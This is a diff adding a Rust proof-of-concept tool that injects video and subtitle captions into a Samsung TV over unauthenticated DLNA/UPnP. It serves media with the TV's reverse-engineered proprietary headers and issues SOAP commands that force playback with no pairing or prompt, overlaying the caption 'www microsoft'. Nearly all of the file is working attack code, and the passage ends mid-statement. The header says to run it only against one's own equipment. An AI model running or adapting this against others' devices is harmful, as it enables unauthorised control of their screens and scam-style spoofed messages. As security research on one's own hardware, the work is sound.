@@ -1,0 +1,919 @@
+//! Unauthenticated DLNA media + caption injection against the owner's own
+//! Samsung UE43NU7470, built to run *on* the owner's RV6699 router.
+//!
+//! Port of caption_poc.py. Everything the Python version learned the hard way is
+//! preserved here, because most of it was only discovered by reversing the TV's
+//! own firmware (libDlnaReaderCore.so / libgstDlnaPlugin.so):
+//!
+//!   * `Server:` must carry the `DLNADOC/1.50` token, and every media response
+//!     ends with `Connection: close` + an actual shutdown - that is what miniDLNA
+//!     does unconditionally (upnphttp.c start_dlna_header).
+//!   * Samsung sets `getMediaInfo.sec` / `getCaptionInfo.sec` on its requests and
+//!     expects `MediaInfo.sec` / `CaptionInfo.sec` back.
+//!   * An open-ended `Range: bytes=N-` must be served to EOF. Truncating it to a
+//!     window makes the renderer report ERROR_OCCURRED within two seconds.
+//!   * Captions are bound through DIDL `<sec:CaptionInfoEx>` and served as
+//!     `smi/caption` with CRLF line endings.
+//!   * The DIDL `<res>` needs size/duration/bitrate/resolution, otherwise
+//!     GetPositionInfo reports TrackDuration 0:00:00.
+//!
+//! Everything here is unauthenticated: no token, no pairing, no on-screen prompt.
+//! Run it against your own equipment only.
+
+use std::collections::BTreeMap;
+use std::fs::File;
+use std::io::{BufRead, BufReader, ErrorKind, Read, Seek, SeekFrom, Write};
+use std::net::{Shutdown, TcpListener, TcpStream, ToSocketAddrs, UdpSocket};
+// MIPS32 has max-atomic-width = 32, so there is no AtomicU64 on this target.
+// Counters are AtomicUsize (32-bit here) and the byte total lives behind a Mutex.
+use std::sync::atomic::{AtomicUsize, Ordering};
+use std::sync::{Arc, Mutex};
+use std::thread;
+use std::time::{Duration, Instant};
+
+// ---------------------------------------------------------------- constants
+
+const DEFAULT_TV: &str = "192.168.1.70";
+const DEFAULT_PORT: u16 = 8099;
+
+const RC_NS: &str = "urn:schemas-upnp-org:service:RenderingControl:1";
+const AV_NS: &str = "urn:schemas-upnp-org:service:AVTransport:1";
+
+/// miniDLNA's MINIDLNA_SERVER_STRING shape. Samsung gates behaviour on the
+/// `DLNADOC/1.50` token being present.
+const SERVER_HDR: &str = "Linux/3.10.0 DLNADOC/1.50 UPnP/1.0 CaptionCast/1.0";
+
+/// The media is expected to be H.264 Main / 1280x720 / square pixels / AAC-LC so
+/// that the advertised profile and the actual content agree.
+const DLNA_FEATURES: &str = "DLNA.ORG_PN=AVC_MP4_MP_HD_720p_AAC;DLNA.ORG_OP=01;\
+DLNA.ORG_CI=0;DLNA.ORG_FLAGS=01700000000000000000000000000000";
+
+/// SRT wants CRLF. LF alone can upset Samsung's parser.
+const SRT_BODY: &str = concat!(
+    "1\r\n00:00:01,000 --> 00:00:10,000\r\nwww microsoft\r\n\r\n",
+    "2\r\n00:00:10,000 --> 00:00:20,000\r\nwww microsoft\r\n\r\n",
+    "3\r\n00:00:20,000 --> 00:00:34,000\r\nwww microsoft\r\n\r\n",
+);
+
+/// `--remote` points the TV at a public clip so our own server leaves the path.
+/// Must be plain http:// - the renderer rejects an https:// URI outright.
+const REMOTE_SAMPLE: &str = "http://www.w3schools.com/html/mov_bbb.mp4";
+
+/// The router has little RAM; do not let每 connection thread take the 2 MB default.
+const THREAD_STACK: usize = 96 * 1024;
+const CHUNK: usize = 64 * 1024;
+
+// ---------------------------------------------------------------- shared state
+
+struct Shared {
+    media: String,
+    caption_url: String,
+    duration_ms: u64,
+    /// serve the caption only when it is actually bound (see `--no-caption`)
+    captions_on: bool,
+    hits: Mutex<Vec<String>>,
+    served: Mutex<u64>,
+    accepted: AtomicUsize,
+    open: AtomicUsize,
+    start: Instant,
+}
+
+impl Shared {
+    fn ts(&self) -> String {
+        format!("t+{:6.2}s", self.start.elapsed().as_secs_f64())
+    }
+    fn note(&self, line: String) {
+        if let Ok(mut h) = self.hits.lock() {
+            h.push(line);
+        }
+    }
+}
+
+// ---------------------------------------------------------------- tiny helpers
+
+fn xesc(s: &str) -> String {
+    let mut o = String::with_capacity(s.len() + 8);
+    for c in s.chars() {
+        match c {
+            '&' => o.push_str("&amp;"),
+            '<' => o.push_str("&lt;"),
+            '>' => o.push_str("&gt;"),
+            '"' => o.push_str("&quot;"),
+            _ => o.push(c),
+        }
+    }
+    o
+}
+
+/// UPnP `res@duration` wants H:MM:SS.mmm
+fn didl_duration(sec: f64) -> String {
+    let total = sec as u64;
+    let ms = ((sec - total as f64) * 1000.0) as u64;
+    format!("{}:{:02}:{:02}.{:03}", total / 3600, (total % 3600) / 60, total % 60, ms)
+}
+
+/// Our address on the path towards the TV, without needing to know the interface.
+fn my_ip(tv: &str) -> std::io::Result<String> {
+    let s = UdpSocket::bind("0.0.0.0:0")?;
+    s.connect((tv, 9197))?;
+    Ok(s.local_addr()?.ip().to_string())
+}
+
+// ---------------------------------------------------------------- mp4 probing
+
+struct Clip {
+    duration: f64,
+    width: u32,
+    height: u32,
+    size: u64,
+}
+
+fn be32(b: &[u8], o: usize) -> u32 {
+    u32::from_be_bytes([b[o], b[o + 1], b[o + 2], b[o + 3]])
+}
+fn be64(b: &[u8], o: usize) -> u64 {
+    let mut v = [0u8; 8];
+    v.copy_from_slice(&b[o..o + 8]);
+    u64::from_be_bytes(v)
+}
+
+/// Walk one level of boxes, yielding (type, body_start, box_end).
+fn atoms(b: &[u8], mut i: usize, end: usize) -> Vec<([u8; 4], usize, usize)> {
+    let mut out = Vec::new();
+    while i + 8 <= end {
+        let mut sz = be32(b, i) as usize;
+        let mut t = [0u8; 4];
+        t.copy_from_slice(&b[i + 4..i + 8]);
+        let mut hdr = 8usize;
+        if sz == 1 {
+            if i + 16 > end {
+                break;
+            }
+            sz = be64(b, i + 8) as usize;
+            hdr = 16;
+        } else if sz == 0 {
+            sz = end - i;
+        }
+        if sz < hdr || i + sz > end {
+            break;
+        }
+        out.push((t, i + hdr, i + sz));
+        i += sz;
+    }
+    out
+}
+
+/// Duration and display size straight out of mvhd/tkhd. Only the first 2 MB are
+/// read, so the file must be faststart (moov up front) - which it must be anyway
+/// for the TV to start without scanning the whole thing.
+fn clip_info(path: &str) -> Option<Clip> {
+    let size = std::fs::metadata(path).ok()?.len();
+    let mut f = File::open(path).ok()?;
+    let mut buf = vec![0u8; (2 << 20).min(size as usize)];
+    let n = f.read(&mut buf).ok()?;
+    buf.truncate(n);
+
+    let mut duration = 0.0f64;
+    let (mut w, mut h) = (0u32, 0u32);
+    for (t, b, e) in atoms(&buf, 0, buf.len()) {
+        if &t != b"moov" {
+            continue;
+        }
+        for (t2, b2, e2) in atoms(&buf, b, e) {
+            if &t2 == b"mvhd" {
+                let (ts, du) = if buf[b2] == 1 {
+                    (be32(&buf, b2 + 20) as u64, be64(&buf, b2 + 24))
+                } else {
+                    (be32(&buf, b2 + 12) as u64, be32(&buf, b2 + 16) as u64)
+                };
+                if ts > 0 {
+                    duration = du as f64 / ts as f64;
+                }
+            } else if &t2 == b"trak" {
+                for (t3, b3, _e3) in atoms(&buf, b2, e2) {
+                    if &t3 != b"tkhd" {
+                        continue;
+                    }
+                    // width/height are 16.16 fixed point right after the matrix
+                    let off = if buf[b3] == 1 { 88 } else { 76 };
+                    if b3 + off + 8 > buf.len() {
+                        continue;
+                    }
+                    let ww = be32(&buf, b3 + off) >> 16;
+                    let hh = be32(&buf, b3 + off + 4) >> 16;
+                    if ww > 0 && hh > 0 {
+                        w = ww; // audio tracks carry 0x0
+                        h = hh;
+                    }
+                }
+            }
+        }
+    }
+    if duration > 0.0 {
+        Some(Clip { duration, width: w, height: h, size })
+    } else {
+        None
+    }
+}
+
+// ---------------------------------------------------------------- HTTP client
+
+struct Url<'a> {
+    host: &'a str,
+    port: u16,
+    path: &'a str,
+}
+
+fn parse_url(u: &str) -> Option<Url<'_>> {
+    let rest = u.strip_prefix("http://")?;
+    let (hostport, path) = match rest.find('/') {
+        Some(i) => (&rest[..i], &rest[i..]),
+        None => (rest, "/"),
+    };
+    let (host, port) = match hostport.rsplit_once(':') {
+        Some((h, p)) => (h, p.parse().ok()?),
+        None => (hostport, 80u16),
+    };
+    Some(Url { host, port, path })
+}
+
+/// Minimal POST. Returns (status, body). Good enough for UPnP control, which
+/// always answers with a Content-Length.
+fn http_post(url: &str, headers: &[(&str, &str)], body: &[u8]) -> std::io::Result<(u16, String)> {
+    let u = parse_url(url)
+        .ok_or_else(|| std::io::Error::new(ErrorKind::InvalidInput, "bad url"))?;
+    let addr = (u.host, u.port)
+        .to_socket_addrs()?
+        .next()
+        .ok_or_else(|| std::io::Error::new(ErrorKind::NotFound, "resolve"))?;
+    let mut s = TcpStream::connect_timeout(&addr, Duration::from_secs(8))?;
+    s.set_read_timeout(Some(Duration::from_secs(15)))?;
+    s.set_write_timeout(Some(Duration::from_secs(15)))?;
+
+    let mut req = format!(
+        "POST {} HTTP/1.1\r\nHost: {}:{}\r\nContent-Length: {}\r\nConnection: close\r\n",
+        u.path,
+        u.host,
+        u.port,
+        body.len()
+    );
+    for (k, v) in headers {
+        req.push_str(&format!("{k}: {v}\r\n"));
+    }
+    req.push_str("\r\n");
+    s.write_all(req.as_bytes())?;
+    s.write_all(body)?;
+    s.flush()?;
+
+    let mut raw = Vec::new();
+    s.read_to_end(&mut raw)?;
+    let text = String::from_utf8_lossy(&raw).into_owned();
+    let status = text
+        .split_whitespace()
+        .nth(1)
+        .and_then(|c| c.parse().ok())
+        .unwrap_or(0);
+    let body = match text.find("\r\n\r\n") {
+        Some(i) => text[i + 4..].to_string(),
+        None => String::new(),
+    };
+    Ok((status, body))
+}
+
+fn soap(ctrl: &str, ns: &str, action: &str, inner: &str) -> (u16, String) {
+    let envelope = format!(
+        "<?xml version=\"1.0\"?>\
+<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" \
+s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body>\
+<u:{action} xmlns:u=\"{ns}\"><InstanceID>0</InstanceID>{inner}\
+</u:{action}></s:Body></s:Envelope>"
+    );
+    let soapaction = format!("\"{ns}#{action}\"");
+    match http_post(
+        ctrl,
+        &[
+            ("Content-Type", "text/xml; charset=\"utf-8\""),
+            ("SOAPACTION", &soapaction),
+        ],
+        envelope.as_bytes(),
+    ) {
+        Ok(v) => v,
+        Err(e) => (0, e.to_string()),
+    }
+}
+
+/// Pull the text between `<tag>` and `</tag>`.
+fn tag<'a>(xml: &'a str, name: &str) -> Option<&'a str> {
+    let open = format!("<{name}>");
+    let close = format!("</{name}>");
+    let a = xml.find(&open)? + open.len();
+    let b = xml[a..].find(&close)? + a;
+    Some(&xml[a..b])
+}
+
+// ---------------------------------------------------------------- HTTP server
+
+fn header<'a>(h: &'a BTreeMap<String, String>, k: &str) -> Option<&'a str> {
+    h.get(&k.to_ascii_lowercase()).map(|s| s.as_str())
+}
+
+/// Parse a Range value into (start, end_inclusive, is_partial).
+fn parse_range(v: &str, size: u64) -> (u64, u64, bool) {
+    let spec = match v.trim().strip_prefix("bytes=") {
+        Some(s) => s,
+        None => return (0, size.saturating_sub(1), false),
+    };
+    let (a, b) = spec.split_once('-').unwrap_or((spec, ""));
+    if a.is_empty() {
+        // suffix range: the last N bytes
+        let n: u64 = b.trim().parse().unwrap_or(0);
+        let start = size.saturating_sub(n);
+        (start, size.saturating_sub(1), true)
+    } else {
+        let start: u64 = a.trim().parse().unwrap_or(0);
+        // An open-ended "bytes=N-" MUST be served to EOF. Capping it to a window
+        // is valid HTTP but Samsung's player treats the short body as a broken
+        // stream and errors out within two seconds.
+        let end = b
+            .trim()
+            .parse::<u64>()
+            .unwrap_or(size.saturating_sub(1))
+            .min(size.saturating_sub(1));
+        (start, end, true)
+    }
+}
+
+fn dlna_common(out: &mut String) {
+    // miniDLNA emits these on every media response and closes the socket after
+    // the body, unconditionally.
+    out.push_str("Connection: close\r\n");
+    out.push_str("EXT:\r\n");
+    out.push_str("realTimeInfo.dlna.org: DLNA.ORG_TLAG=*\r\n");
+}
+
+fn serve_srt(mut s: TcpStream, sh: &Shared, head_only: bool) -> std::io::Result<()> {
+    println!("    <<< {} GET /poc.srt  [SUBTITLE FETCHED]", sh.ts());
+    sh.note("srt".into());
+    let body = SRT_BODY.as_bytes();
+    let mut h = String::new();
+    h.push_str("HTTP/1.1 200 OK\r\n");
+    h.push_str(&format!("Server: {SERVER_HDR}\r\n"));
+    // miniDLNA serves captions as smi/caption; text/* is wrong for Samsung.
+    h.push_str("Content-Type: smi/caption\r\n");
+    h.push_str(&format!("Content-Length: {}\r\n", body.len()));
+    h.push_str("transferMode.dlna.org: Interactive\r\n");
+    dlna_common(&mut h);
+    h.push_str("\r\n");
+    s.write_all(h.as_bytes())?;
+    if !head_only {
+        s.write_all(body)?;
+    }
+    let _ = s.flush();
+    let _ = s.shutdown(Shutdown::Write);
+    Ok(())
+}
+
+fn serve_media(
+    mut s: TcpStream,
+    sh: &Shared,
+    hdrs: &BTreeMap<String, String>,
+    head_only: bool,
+) -> std::io::Result<()> {
+    let size = std::fs::metadata(&sh.media)?.len();
+    let rng = header(hdrs, "range");
+    let (start, end, partial) = match rng {
+        Some(v) => parse_range(v, size),
+        None => (0, size.saturating_sub(1), false),
+    };
+    let length = end.saturating_sub(start) + 1;
+
+    println!(
+        "    <<< {} {} /media.mp4  Range={}",
+        sh.ts(),
+        if head_only { "HEAD" } else { "GET" },
+        rng.unwrap_or("-")
+    );
+    // Samsung's own headers tell us what it wants back; log them, they matter.
+    let interesting: Vec<String> = hdrs
+        .iter()
+        .filter(|(k, _)| {
+            !matches!(
+                k.as_str(),
+                "host" | "range" | "accept" | "connection" | "user-agent" | "accept-encoding"
+            )
+        })
+        .map(|(k, v)| format!("{k}: {v}"))
+        .collect();
+    if !interesting.is_empty() {
+        println!("        hdrs: {}", interesting.join("; "));
+    }
+    sh.note("media".into());
+
+    let mut h = String::new();
+    h.push_str(if partial {
+        "HTTP/1.1 206 Partial Content\r\n"
+    } else {
+        "HTTP/1.1 200 OK\r\n"
+    });
+    h.push_str(&format!("Server: {SERVER_HDR}\r\n"));
+    h.push_str("Content-Type: video/mp4\r\n");
+    h.push_str(&format!("Content-Length: {length}\r\n"));
+    h.push_str("Accept-Ranges: bytes\r\n");
+    if partial {
+        h.push_str(&format!("Content-Range: bytes {start}-{end}/{size}\r\n"));
+    }
+    h.push_str("transferMode.dlna.org: Streaming\r\n");
+    h.push_str(&format!("contentFeatures.dlna.org: {DLNA_FEATURES}\r\n"));
+    // Samsung's proprietary handshake. Without SEC_Duration the renderer does not
+    // learn the clip length; without CaptionInfo.sec it never binds the subtitle.
+    if header(hdrs, "getmediainfo.sec").is_some() && sh.duration_ms > 0 {
+        h.push_str(&format!("MediaInfo.sec: SEC_Duration={};\r\n", sh.duration_ms));
+    }
+    if header(hdrs, "getcaptioninfo.sec").is_some() && sh.captions_on {
+        h.push_str(&format!("CaptionInfo.sec: {}\r\n", sh.caption_url));
+    }
+    dlna_common(&mut h);
+    h.push_str("\r\n");
+    s.write_all(h.as_bytes())?;
+    if head_only {
+        let _ = s.flush();
+        let _ = s.shutdown(Shutdown::Write);
+        return Ok(());
+    }
+
+    let mut f = File::open(&sh.media)?;
+    f.seek(SeekFrom::Start(start))?;
+    let mut left = length;
+    let mut buf = vec![0u8; CHUNK];
+    let t0 = Instant::now();
+    let mut last_write = Instant::now();
+    let mut max_gap = 0.0f64;
+    let mut sent: u64 = 0;
+    let mut why = "completed";
+
+    while left > 0 {
+        let want = CHUNK.min(left as usize);
+        let n = match f.read(&mut buf[..want]) {
+            Ok(0) => {
+                why = "eof";
+                break;
+            }
+            Ok(n) => n,
+            Err(e) => {
+                why = if e.kind() == ErrorKind::Interrupted { continue } else { "file error" };
+                break;
+            }
+        };
+        if let Err(e) = s.write_all(&buf[..n]) {
+            why = match e.kind() {
+                ErrorKind::ConnectionReset => "RST (peer reset)",
+                ErrorKind::BrokenPipe => "FIN (peer closed, then we wrote)",
+                ErrorKind::ConnectionAborted => "ABORTED locally",
+                _ => "write error",
+            };
+            break;
+        }
+        // A blocking write hides stalls. The TV's reader runs select() with a
+        // 5000 ms timeout (libDlnaReaderCore, 0x1388) and three attempts, so a
+        // long gap here is exactly what would make it drop the session.
+        let gap = last_write.elapsed().as_secs_f64();
+        if gap > max_gap {
+            max_gap = gap;
+        }
+        if gap >= 1.0 {
+            println!(
+                "    !!! {} WRITE STALLED {:.2}s after {:.2} MB{}",
+                sh.ts(),
+                gap,
+                sent as f64 / 1e6,
+                if gap >= 5.0 { "   <-- exceeds the TV's 5s read timeout" } else { "" }
+            );
+        }
+        last_write = Instant::now();
+        left -= n as u64;
+        sent += n as u64;
+        if let Ok(mut t) = sh.served.lock() { *t += n as u64; }
+    }
+
+    let _ = s.flush();
+    let _ = s.shutdown(Shutdown::Write); // miniDLNA closes every media socket
+    let el = t0.elapsed().as_secs_f64().max(0.001);
+    println!(
+        "    --- {} stream @{start} ended: {why}; sent {:.2} of {:.2} MB in {:.1}s \
+         ({:.1} Mbit/s)  maxWriteGap={:.2}s",
+        sh.ts(),
+        sent as f64 / 1e6,
+        length as f64 / 1e6,
+        el,
+        sent as f64 * 8.0 / 1e6 / el,
+        max_gap
+    );
+    Ok(())
+}
+
+fn handle(stream: TcpStream, sh: Arc<Shared>) {
+    let _ = stream.set_nodelay(true); // streaming: latency over batching
+    let _ = stream.set_read_timeout(Some(Duration::from_secs(20)));
+    let _ = stream.set_write_timeout(Some(Duration::from_secs(30)));
+
+    let peer = stream
+        .peer_addr()
+        .map(|a| a.to_string())
+        .unwrap_or_else(|_| "?".into());
+    let n = sh.accepted.fetch_add(1, Ordering::Relaxed) + 1;
+    let open = sh.open.fetch_add(1, Ordering::Relaxed) + 1;
+    println!("    ~~~ {} ACCEPT #{n} from {peer}  ({open} open)", sh.ts());
+
+    let res = (|| -> std::io::Result<()> {
+        let mut rd = BufReader::new(stream.try_clone()?);
+        let mut line = String::new();
+        if rd.read_line(&mut line)? == 0 {
+            return Ok(());
+        }
+        let mut it = line.split_whitespace();
+        let method = it.next().unwrap_or("").to_string();
+        let path = it.next().unwrap_or("/").to_string();
+
+        let mut hdrs = BTreeMap::new();
+        loop {
+            let mut l = String::new();
+            if rd.read_line(&mut l)? == 0 {
+                break;
+            }
+            let t = l.trim_end();
+            if t.is_empty() {
+                break;
+            }
+            if let Some((k, v)) = t.split_once(':') {
+                hdrs.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
+            }
+        }
+
+        let head_only = method.eq_ignore_ascii_case("HEAD");
+        if path.ends_with(".srt") {
+            serve_srt(stream, &sh, head_only)
+        } else {
+            serve_media(stream, &sh, &hdrs, head_only)
+        }
+    })();
+    if let Err(e) = res {
+        // The TV aborts probe connections constantly; that is normal, not a fault.
+        if !matches!(
+            e.kind(),
+            ErrorKind::ConnectionReset | ErrorKind::ConnectionAborted | ErrorKind::BrokenPipe
+        ) {
+            println!("    ~~~ {} handler error: {e}", sh.ts());
+        }
+    }
+    let open = sh.open.fetch_sub(1, Ordering::Relaxed) - 1;
+    println!("    ~~~ CLOSE  ({open} still open)");
+}
+
+// ---------------------------------------------------------------- DIDL / control
+
+fn didl(media_uri: &str, cap_uri: Option<&str>, res_attrs: &str) -> String {
+    let mut cap = String::new();
+    let mut sub_res = String::new();
+    if let Some(c) = cap_uri {
+        cap = format!(
+            "<sec:CaptionInfoEx sec:type=\"srt\">{0}</sec:CaptionInfoEx>\
+<sec:CaptionInfo sec:type=\"srt\">{0}</sec:CaptionInfo>",
+            xesc(c)
+        );
+        sub_res = format!(
+            "<res protocolInfo=\"http-get:*:text/srt:*\">{}</res>",
+            xesc(c)
+        );
+    }
+    format!(
+        "<DIDL-Lite xmlns=\"urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/\" \
+xmlns:dc=\"http://purl.org/dc/elements/1.1/\" \
+xmlns:upnp=\"urn:schemas-upnp-org:metadata-1-0/upnp/\" \
+xmlns:sec=\"http://www.sec.co.kr/\">\
+<item id=\"poc1\" parentID=\"0\" restricted=\"1\">\
+<dc:title>poc</dc:title>\
+<upnp:class>object.item.videoItem</upnp:class>\
+{cap}\
+<res protocolInfo=\"http-get:*:video/mp4:*\"{res_attrs}>{}</res>\
+{sub_res}</item></DIDL-Lite>",
+        xesc(media_uri)
+    )
+}
+
+struct Tv {
+    av: String,
+    rc: String,
+}
+
+impl Tv {
+    fn new(ip: &str) -> Self {
+        Self {
+            av: format!("http://{ip}:9197/upnp/control/AVTransport1"),
+            rc: format!("http://{ip}:9197/upnp/control/RenderingControl1"),
+        }
+    }
+    fn av(&self, action: &str, inner: &str) -> (u16, String) {
+        soap(&self.av, AV_NS, action, inner)
+    }
+    fn rc(&self, action: &str, inner: &str) -> (u16, String) {
+        soap(&self.rc, RC_NS, action, inner)
+    }
+    /// (state, status, "pos/duration")
+    fn transport(&self) -> (String, String, String) {
+        let (_, a) = self.av("GetTransportInfo", "");
+        let st = tag(&a, "CurrentTransportState").unwrap_or("?").to_string();
+        let sts = tag(&a, "CurrentTransportStatus").unwrap_or("?").to_string();
+        let (_, b) = self.av("GetPositionInfo", "");
+        let pos = tag(&b, "RelTime").unwrap_or("?");
+        // TrackDuration 0:00:00 means the renderer never learned the clip length -
+        // the symptom of a <res> element with no duration attribute.
+        let dur = tag(&b, "TrackDuration").unwrap_or("?");
+        (st, sts, format!("{pos}/{dur}"))
+    }
+}
+
+// ---------------------------------------------------------------- CLI
+
+struct Args {
+    flags: Vec<String>,
+}
+impl Args {
+    fn new() -> Self {
+        Self { flags: std::env::args().skip(1).collect() }
+    }
+    fn has(&self, f: &str) -> bool {
+        self.flags.iter().any(|a| a == f)
+    }
+    fn val(&self, f: &str) -> Option<String> {
+        let i = self.flags.iter().position(|a| a == f)?;
+        self.flags.get(i + 1).filter(|v| !v.starts_with("--")).cloned()
+    }
+}
+
+fn usage() {
+    println!(
+        "captioncast - unauthenticated DLNA media/caption injection PoC (own equipment only)
+
+  --tv <ip>          target renderer            (default {DEFAULT_TV})
+  --media <path>     mp4 to serve, faststart    (default ./media.mp4)
+  --port <n>         local HTTP port            (default {DEFAULT_PORT})
+  --status           read-only: transport + caption state, then exit
+  --stop             Stop playback + disable the caption, then exit
+  --no-caption       A/B control: same media, no subtitle bound
+  --ctrl-caption     also fire X_ControlCaption(Enable) during playback
+  --remote [url]     point the TV at a remote clip, bypassing our server
+  --nopoll           do not poll the renderer while it streams
+  --help"
+    );
+}
+
+// ---------------------------------------------------------------- main
+
+fn main() {
+    let args = Args::new();
+    if args.has("--help") || args.has("-h") {
+        usage();
+        return;
+    }
+
+    let tv_ip = args.val("--tv").unwrap_or_else(|| DEFAULT_TV.to_string());
+    let port: u16 = args
+        .val("--port")
+        .and_then(|v| v.parse().ok())
+        .unwrap_or(DEFAULT_PORT);
+    let media = args.val("--media").unwrap_or_else(|| "media.mp4".to_string());
+    let tv = Tv::new(&tv_ip);
+
+    if args.has("--status") {
+        let (st, sts, pos) = tv.transport();
+        println!("=== read-only status of {tv_ip} ===");
+        println!("  transport -> state={st}  status={sts}  pos={pos}");
+        let (code, raw) = tv.rc("X_GetCaptionState", "");
+        println!(
+            "  X_GetCaptionState -> HTTP {code}  Captions={:?}  Enabled={:?}",
+            tag(&raw, "Captions").unwrap_or("").trim(),
+            tag(&raw, "EnabledCaptions").unwrap_or("").trim()
+        );
+        return;
+    }
+
+    let ip = match my_ip(&tv_ip) {
+        Ok(v) => v,
+        Err(e) => {
+            eprintln!("cannot determine our address towards {tv_ip}: {e}");
+            std::process::exit(1);
+        }
+    };
+    let media_uri_local = format!("http://{ip}:{port}/media.mp4");
+    let cap_uri = format!("http://{ip}:{port}/poc.srt");
+
+    if args.has("--stop") {
+        let (c1, _) = tv.rc(
+            "X_ControlCaption",
+            &format!(
+                "<Operation>Disable</Operation><Name>poc.srt</Name>\
+<ResourceURI>{}</ResourceURI><CaptionURI>{}</CaptionURI>\
+<CaptionType>srt</CaptionType><Language>eng</Language><Encoding>UTF-8</Encoding>",
+                xesc(&media_uri_local),
+                xesc(&cap_uri)
+            ),
+        );
+        println!("[x] X_ControlCaption(Disable) -> HTTP {c1}");
+        let (c2, _) = tv.av("Stop", "");
+        println!("[x] Stop -> HTTP {c2}");
+        return;
+    }
+
+    // clip metadata: without res@duration the renderer reports TrackDuration 0
+    let clip = clip_info(&media);
+    let (res_attrs, dur_ms) = match &clip {
+        Some(c) => (
+            format!(
+                " size=\"{}\" duration=\"{}\" bitrate=\"{}\"{}",
+                c.size,
+                didl_duration(c.duration),
+                (c.size as f64 / c.duration) as u64,
+                if c.width > 0 {
+                    format!(" resolution=\"{}x{}\"", c.width, c.height)
+                } else {
+                    String::new()
+                }
+            ),
+            (c.duration * 1000.0) as u64,
+        ),
+        None => (String::new(), 0),
+    };
+
+    let captions_on = !args.has("--no-caption") && !args.has("--remote");
+    let sh = Arc::new(Shared {
+        media: media.clone(),
+        caption_url: cap_uri.clone(),
+        duration_ms: dur_ms,
+        captions_on,
+        hits: Mutex::new(Vec::new()),
+        served: Mutex::new(0),
+        accepted: AtomicUsize::new(0),
+        open: AtomicUsize::new(0),
+        start: Instant::now(),
+    });
+
+    println!("=== Unauthenticated DLNA caption-injection PoC vs {tv_ip} (no auth header) ===");
+    println!("    media   {media_uri_local}   <- {media}");
+    println!("    caption {cap_uri}   text = 'www microsoft'");
+    if let Some(c) = &clip {
+        println!(
+            "    clip    {:.1}s @ {:.2} Mbit/s  {}x{}",
+            c.duration,
+            c.size as f64 * 8.0 / c.duration / 1e6,
+            c.width,
+            c.height
+        );
+        println!("    res    {}", res_attrs.trim());
+    } else {
+        println!("    clip    (no mvhd in the first 2 MB - is the file faststart?)");
+    }
+
+    // listener
+    let listener = match TcpListener::bind(("0.0.0.0", port)) {
+        Ok(l) => l,
+        Err(e) => {
+            eprintln!("bind 0.0.0.0:{port} failed: {e}");
+            std::process::exit(1);
+        }
+    };
+    println!("[0] HTTP listener up on 0.0.0.0:{port} (Range-capable)");
+    {
+        let sh = Arc::clone(&sh);
+        thread::Builder::new()
+            .name("http".into())
+            .stack_size(THREAD_STACK)
+            .spawn(move || {
+                for c in listener.incoming() {
+                    match c {
+                        Ok(stream) => {
+                            let sh = Arc::clone(&sh);
+                            let _ = thread::Builder::new()
+                                .stack_size(THREAD_STACK)
+                                .spawn(move || handle(stream, sh));
+                        }
+                        Err(_) => continue,
+                    }
+                }
+            })
+            .expect("spawn http thread");
+    }
+
+    // where the TV should fetch from
+    let media_uri = if args.has("--remote") {
+        let u = args.val("--remote").unwrap_or_else(|| REMOTE_SAMPLE.to_string());
+        println!("    [PARTITION] remote media, local server bypassed:\n      {u}");
+        u
+    } else {
+        media_uri_local.clone()
+    };
+    let meta = didl(
+        &media_uri,
+        if captions_on { Some(cap_uri.as_str()) } else { None },
+        if args.has("--remote") { "" } else { &res_attrs },
+    );
+
+    // Clear any stale session: a previous run leaves the renderer STOPPED with the
+    // old TrackURI loaded, and control points are expected to Stop first.
+    let (c, _) = tv.av("Stop", "");
+    println!("[0b] Stop (clear stale session) -> HTTP {c}");
+    thread::sleep(Duration::from_secs(1));
+
+    let (c, raw) = tv.av(
+        "SetAVTransportURI",
+        &format!(
+            "<CurrentURI>{}</CurrentURI><CurrentURIMetaData>{}</CurrentURIMetaData>",
+            xesc(&media_uri),
+            xesc(&meta)
+        ),
+    );
+    println!(
+        "[1] SetAVTransportURI (+sec:CaptionInfoEx) -> HTTP {c}{}",
+        if c == 200 { "  OK".to_string() } else { format!("\n    {}", &raw[..raw.len().min(300)]) }
+    );
+
+    let (c, raw) = tv.av("Play", "<Speed>1</Speed>");
+    println!(
+        "[2] Play -> HTTP {c}{}",
+        if c == 200 { "  OK".to_string() } else { format!("\n    {}", &raw[..raw.len().min(300)]) }
+    );
+
+    // Polling costs the renderer two fresh TCP connections per call, which is a
+    // lot for a constrained device that is also pulling the stream. --nopoll
+    // leaves it alone and checks once at the end.
+    let watch = |secs: u64, label: &str| {
+        if args.has("--nopoll") {
+            println!("[.] {label}: NOT polling (leaving the TV alone for {secs}s)");
+            thread::sleep(Duration::from_secs(secs));
+            let (st, sts, pos) = tv.transport();
+            println!("    {} state={st}  status={sts}  pos={pos}   (single check)", sh.ts());
+        } else {
+            println!("[.] {label}: polling transport for {secs}s");
+            let mut last = String::new();
+            for _ in 0..secs {
+                let (st, sts, pos) = tv.transport();
+                let cur = format!("{st}/{sts}");
+                if cur != last {
+                    println!("    {} state={st}  status={sts}  pos={pos}", sh.ts());
+                    last = cur;
+                }
+                thread::sleep(Duration::from_secs(1));
+            }
+        }
+    };
+
+    watch(15, "after Play");
+
+    if args.has("--ctrl-caption") {
+        let (c, _) = tv.rc(
+            "X_ControlCaption",
+            &format!(
+                "<Operation>Enable</Operation><Name>poc.srt</Name>\
+<ResourceURI>{}</ResourceURI><CaptionURI>{}</CaptionURI>\
+<CaptionType>srt</CaptionType><Language>eng</Language><Encoding>UTF-8</Encoding>",
+                xesc(&media_uri),
+                xesc(&cap_uri)
+            ),
+        );
+        println!("\n[4] X_ControlCaption(Enable) during playback -> HTTP {c}");
+    } else {
+        println!(
+            "\n[4] X_ControlCaption skipped (caption already bound via DIDL; \
+             pass --ctrl-caption to exercise it)"
+        );
+    }
+
+    watch(30, "WATCH THE SCREEN for 'www microsoft'");
+
+    println!("\n=== RESULT ===");
+    let hits = sh.hits.lock().map(|h| h.clone()).unwrap_or_default();
+    let subs = hits.iter().filter(|h| h.as_str() == "srt").count();
+    let med = hits.len() - subs;
+    println!("media fetches: {med}   subtitle fetches: {subs}");
+    if let Some(c) = &clip {
+        let mb = *sh.served.lock().unwrap_or_else(|e| e.into_inner()) as f64 / 1e6;
+        println!(
+            "clip: {:.1}s, {:.1} MB total; we served {:.1} MB ({:.0}% of the file)",
+            c.duration,
+            c.size as f64 / 1e6,
